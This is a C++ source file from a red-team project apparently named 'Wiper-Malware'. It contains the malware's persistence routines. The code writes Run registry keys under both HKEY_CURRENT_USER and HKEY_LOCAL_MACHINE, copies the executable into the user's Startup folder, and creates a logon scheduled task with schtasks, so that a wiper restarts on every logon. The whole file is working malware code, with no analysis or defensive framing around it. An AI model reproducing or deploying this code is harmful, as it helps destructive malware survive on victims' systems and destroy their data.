/*RED TEAM 444
  author : U0lEREhBTlQ=
  https://github.com/RED-TEAM-444/Wiper-Malware.git
*/

#include <windows.h>
#include <iostream>
#include <shlobj.h>

// Function to add malware to the registry for persistence
void addRegistryKey(const std::string& exePath, HKEY rootKey, const std::string& keyName) {
    HKEY hKey;
    LONG regOpen = RegOpenKeyEx(rootKey, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);

    if (regOpen == ERROR_SUCCESS) {
        LONG regSet = RegSetValueEx(hKey, keyName.c_str(), 0, REG_SZ, (BYTE*)exePath.c_str(), exePath.length() + 1);
        if (regSet == ERROR_SUCCESS) {
            std::cout << "Persistence added successfully to " << (rootKey == HKEY_LOCAL_MACHINE ? "HKEY_LOCAL_MACHINE" : "HKEY_CURRENT_USER") << ".\n";
        }
        RegCloseKey(hKey);
    } else {
        std::cerr << "Failed to open registry key for persistence.\n";
    }
}

// Function to add malware to startup folder
void addStartupFolder(const std::string& exePath) {
    char startupPath[MAX_PATH];
    HRESULT result = SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupPath);

    if (result == S_OK) {
        std::string shortcutPath = std::string(startupPath) + "\\malware.lnk";
        CopyFile(exePath.c_str(), shortcutPath.c_str(), FALSE);  // Copy executable to startup folder
        std::cout << "Persistence added to startup folder.\n";
    } else {
        std::cerr << "Failed to get startup folder path.\n";
    }
}

// Function to add a scheduled task for malware persistence
void addScheduledTask(const std::string& exePath) {
    // Use schtasks command to schedule the malware to run at logon
    std::string command = "schtasks /create /tn \"MyMalware\" /tr \"" + exePath + "\" /sc onlogon /f";
    system(command.c_str());
    std::cout << "Scheduled task for persistence added.\n";
}

void runPersistence() {
    std::string exePath = "C:\\path\\to\\malware.exe";

    // Try registry-based persistence (HKEY_CURRENT_USER and HKEY_LOCAL_MACHINE)
    addRegistryKey(exePath, HKEY_CURRENT_USER, "MyWiperMalware");
    addRegistryKey(exePath, HKEY_LOCAL_MACHINE, "MyWiperMalware");

    // Add to startup folder
    addStartupFolder(exePath);

    // Schedule a task for persistence
    addScheduledTask(exePath);
}
